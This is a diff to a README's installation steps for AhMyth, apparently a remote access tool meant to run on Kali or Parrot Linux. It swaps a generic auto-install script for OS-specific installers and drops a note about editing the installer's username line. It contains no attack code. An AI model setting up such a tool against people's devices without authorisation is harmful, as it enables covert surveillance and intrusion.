@@ -21,14 +21,10 @@
 ### Auto Installation
     1. git clone https://github.com/Morsmalleo/AhMyth    
     2. cd AhMyth/AhMyth-Server
-    3. chmod +x autoinstall
-    4. sudo ./autoinstall
+    3. chmod +x Ahmyth-kali | chmod +x Ahmyth-parrot
+    4. sudo ./Ahmyth-kali | sudo ./Ahmyth-parrot
     5. Type the number that corresponds to Java 11 or Java 8 when prompted   
     6. Type `ahmyth` anywhere in the terminal to auto-launch AhMyth
- 
-If you have changed your Kali or Parrot username from its default username then you will need to edit `Line 90` of the intaller script you are going to use based on your OS, and insert your own username that you are currently using. 
-
-for example if your username was `bashful` you would change the username on `Line 90` from `kali` or `user` to `bashful`
 #
 ### Manual Installation
     1. git clone https://github.com/Morsmalleo/AhMyth
